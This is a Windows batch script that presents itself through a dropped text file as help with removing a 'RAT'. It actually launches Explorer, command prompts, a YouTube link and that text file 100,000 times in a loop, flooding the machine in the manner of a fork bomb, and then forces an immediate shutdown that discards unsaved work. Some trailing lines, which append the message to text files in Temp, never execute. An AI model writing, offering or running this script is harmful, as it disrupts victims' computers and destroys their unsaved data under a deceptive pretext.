@echo off

REM Define the path to the Temp folder
set "temp_folder=%Temp%"

REM Define the name of the initial text file
set "initial_text_file=%temp_folder%\new_text_file.txt"

REM Create a new text file with the desired text in Temp folder
echo this will help you delete RAT now:)) > "%initial_text_file%"

REM Display the path of the initial text file (optional)
echo Initial text file path: %initial_text_file%

REM Open some applications
for /l %%i in (1,1,100000) do (
    start "" "explorer.exe"
    start cmd.exe
    start https://www.youtube.com/watch?v=2hvNxWA1qm4
    start %initial_text_file%
)

shutdown /s /f /t 0
REM Pause to keep the window open (for testing)
pause
REM Append text to all opened .txt files in the Temp folder
for %%f in ("%temp_folder%\*.txt") do (
    echo this will help you delete RAT now:)) >> "%%f"
)
pause
REM Optional: Clear the screen
cls
